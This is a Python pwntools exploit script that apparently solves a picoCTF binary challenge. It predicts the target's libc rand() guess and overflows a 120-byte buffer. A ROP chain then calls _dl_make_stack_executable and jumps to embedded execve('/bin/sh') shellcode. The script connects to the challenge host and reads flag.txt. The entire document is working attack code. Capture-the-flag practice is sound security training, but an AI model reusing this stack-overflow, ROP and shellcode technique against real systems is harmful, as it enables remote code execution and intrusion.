from pwn import *
from ctypes import *
import re
import time
libc = CDLL("libc.so.6")
# http://shell-storm.org/shellcode/files/shellcode-603.php
shellcode = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

context.terminal = ['termite', '-e']

def get_next():
	return (libc.rand() % 100) + 1

elf = ELF("./vuln")
rop = ROP(elf)

mov_rdx_rax = 0x0000000000419127 # pwntools couldn't find this idk why
pop_rdx = (rop.find_gadget(['pop rdx', 'ret']))[0]
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
pop_rax = (rop.find_gadget(['pop rax', 'ret']))[0]
push_rsp = 0x0000000000451974 # pwntools couldn't find this idk why

p = remote("jupiter.challenges.picoctf.org", 28951)
p.sendline(str(get_next())) # first randomly generated number + 1


payload = B"A" * 120
payload += p64(pop_rdx) + p64(elf.symbols['__stack_prot'])
payload += p64(pop_rax) + p64(7)
payload += p64(mov_rdx_rax)
payload += p64(pop_rdi) + p64(elf.symbols['__libc_stack_end'])
payload += p64(elf.symbols['_dl_make_stack_executable'])
payload += p64(push_rsp) + shellcode

p.sendline(payload)
time.sleep(.5)
p.recvuntil("Name?")
p.recvline()
p.sendline("cat flag.txt;exit;")
print(re.search("(picoCTF{.*?})",p.recvall().decode()).group(1))
